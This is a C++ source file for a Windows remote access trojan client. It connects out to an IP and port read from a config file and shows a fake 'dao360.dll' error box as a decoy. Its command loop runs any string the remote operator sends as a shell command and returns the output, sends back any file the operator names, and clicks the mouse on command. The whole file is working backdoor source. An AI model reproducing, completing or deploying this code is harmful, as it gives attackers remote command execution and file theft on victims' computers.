
#pragma comment(lib,"ws2_32.lib")
#include "winsock2.h"
#include "windows.h"
#include "string"
#include "w_sock.h"
#include "fstream"
#include "smokot.h"
#pragma warning(disable:4996)
#pragma comment(lib, "winmm.lib")
HINSTANCE savehinst = NULL;
w_sock w_socket;


void handler(SOCKET sock)
{
	char temp[] = " >> C:\\temp.txt";
	char buffer[5000] = "";
	char buf[] = "download";
	char buf_check_online[] = "228";
	while (true)
	{
		
		int res = recv(sock, buffer, sizeof(buffer), NULL);//1
		if (res <= 0) {
			break;
			
			
		}
		if (strcmp(buffer, buf_check_online) == 0) {

		}
		if (strcmp(buffer, buf) == 0) {
			
			Sleep(200);
			send(sock, buf, sizeof(buf), NULL);//2
			send(sock, buf, sizeof(buf), NULL);//2
			int take = recv(sock, buffer, sizeof(buffer), NULL);//3




			
			fstream file(buffer);
			int size = 0;
			file.seekg(0, std::ios::end);
			size = file.tellg(); // Узнаём размер файла
			file.close(); 
			SMOKOT smokot;
			char * size_in_char = smokot.int_to_char(size);
			//char * buf = (char*)malloc(sizeof(char) * size);

			send(sock, size_in_char, sizeof(size_in_char)*4, NULL);

			char * buf_send = (char*)malloc(sizeof(char) * size);

			FILE * filer = fopen(buffer, "rb");

			fread(buf_send, 1, size, filer);

			fclose(filer);

		
			send(sock, buf_send, size, NULL);//Отправили файл binary
			
		}
		else {
			//lft - LEFT CLICK MOUSE
			//rgt - RIGHT CLICK MOUSE
			if (buffer[0] == 's' && buffer[1] == 'o' && buffer[2] == 'u' && buffer[3] == 'n' && buffer[4] == 'd')
			{
				PlaySound(TEXT("C:\\Program Files\\lol.wav"), NULL, SND_SYNC);
				
			}
			if (buffer[0] == 'r' && buffer[1] == 'g' && buffer[2] == 't')
			{
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			}
			if (buffer[0] == 'l' && buffer[1] == 'f' && buffer[2] == 't')
			{
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			}
			else {
				ofstream file;
				file.open("C:\\temp.txt");
				file << "";
				file.close();


				strcat(buffer, temp);

				system(buffer);



				FILE *filer = fopen("C:\\temp.txt", "r");
				char buffer_temp[5000] = "";

				fread(buffer_temp, 1, sizeof(buffer_temp), filer);
				send(sock, buffer_temp, sizeof(buffer), NULL);
				fclose(filer);

				file.open("C:\\temp.txt");
				file << "";
				file.close();
			}
			
		}
		
	}
	ExitThread(1);
	
}


LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
		case WM_CREATE:
		{
			HWND hButton = CreateWindow("BUTTON", "EXAMPLE BUTTON", 
				WS_CHILD |WS_VISIBLE| BS_PUSHBUTTON,
				0, 0, 200, 30, hwnd, (HMENU)1, savehinst, NULL);

		


			ifstream file("backlog.data");
			string line;
			while (!file.eof())
			{
				file >> line;
				w_socket.data.push_back(line);
			}

			
			WSAData wsa;
			if (WSAStartup(MAKEWORD(2, 1), &wsa))
			{
				PostQuitMessage(0);
			}
			SOCKADDR_IN addr;
			SMOKOT smokot;


			int port = smokot.string_to_int(w_socket.data[1]);
			char * ip = smokot.string_to_char(w_socket.data[0]);
			addr.sin_addr.S_un.S_addr = inet_addr(ip);
			addr.sin_family = AF_INET;
			addr.sin_port = htons(port);

			


			SOCKET socket_main = socket(AF_INET, SOCK_STREAM, NULL);

			connect(socket_main, (sockaddr*)&addr, sizeof(addr));

			CreateThread(NULL, NULL, LPTHREAD_START_ROUTINE(handler), LPVOID(socket_main), NULL, NULL);

			MessageBox(NULL, "Ошибка при обращении к dao360.dll", "Warning", MB_ICONSTOP);

			
			break;
		}
		case WM_DESTROY:
		{
			PostQuitMessage(1);
			break;
		}
		case WM_COMMAND:
		{
			switch (wParam)
			{
				case 1:
				{
					HWND hwnd = FindWindow(NULL, "client");
					ShowWindow(hwnd, SW_HIDE);
					break;
				}
			}
			break;
		}
	}



	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}








int CALLBACK wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR szCmdLine, int nCmdShow)
{
	HWND hwnd;
	MSG msg;
	WNDCLASSEX wc = { sizeof(WNDCLASSEX) };
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hInstance = hInstance;
	wc.lpfnWndProc = WndProc;
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.hbrBackground = reinterpret_cast<HBRUSH>(GetStockObject(WHITE_BRUSH));
	wc.lpszClassName = "client";
	RegisterClassEx(&wc);

	savehinst = hInstance;

	hwnd = CreateWindow(wc.lpszClassName, "client",
		WS_OVERLAPPEDWINDOW| WS_EX_ACCEPTFILES, 500, 500, 400, 400,
		NULL, NULL, wc.hInstance, NULL);

	ShowWindow(hwnd, nCmdShow);
	UpdateWindow(hwnd);

	

	SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
	SetLayeredWindowAttributes(hwnd, 0, (255 * 90) / 100, LWA_ALPHA);

	while (GetMessage(&msg, NULL, NULL, NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}



	return static_cast<int>(msg.wParam);
}